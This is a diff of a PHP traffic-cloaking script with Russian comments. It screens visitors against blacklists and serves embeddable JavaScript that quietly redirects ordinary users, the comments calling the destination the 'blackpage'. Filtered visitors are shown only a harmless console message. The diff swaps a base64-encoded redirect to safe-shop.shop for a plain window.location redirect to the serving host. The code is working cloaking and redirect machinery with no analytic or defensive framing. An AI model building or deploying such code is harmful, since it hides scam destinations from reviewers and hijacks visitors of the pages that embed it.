@@ -3,6 +3,7 @@
 
 // Включаем доступ к скрипту сторонним сайтам
 header('Access-Control-Allow-Origin: *');
+header('Content-Type: text/javascript');
 
 //Включение отладочной информации
 ini_set('display_errors','1'); 
@@ -25,24 +26,16 @@ $cloacker->isp_black = $isp_black;
 
 //Проверяем зашедшего пользователя
 $check_result = $cloacker->check();
-if (!isset($cloacker->result))
-	$cloacker->result=['OK'];
 
-if ($check_result == 0 ||$disable_tds) //Обычный юзверь или отключена фильтрация
+if ($check_result == 0 || $disable_tds) //Обычный юзверь или отключена фильтрация
 {
-	$redirect_rule = 0; // Если 0, то редиректим на БлекПейдж
+	if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
+		$url = "https://";   
+	else  
+		$url = "http://";   
+	$url.= $_SERVER['HTTP_HOST'];  
+
+	echo "window.location='{$url}';";
 } 
-
-// Адрес нашего blackpage
-$redirect_url = "https://safe-shop.shop/";
-
-
-$phpjsresponse = "<script type='text/javascript'>
-  document.location.href='{$redirect_url}';
-</script>";
-
-// Отдаем закодированный код js редиректа
-if ($redirect_rule === 0)
-	echo base64_encode($phpjsresponse);
 else
-	echo '';
+	echo 'console.log("OK");';
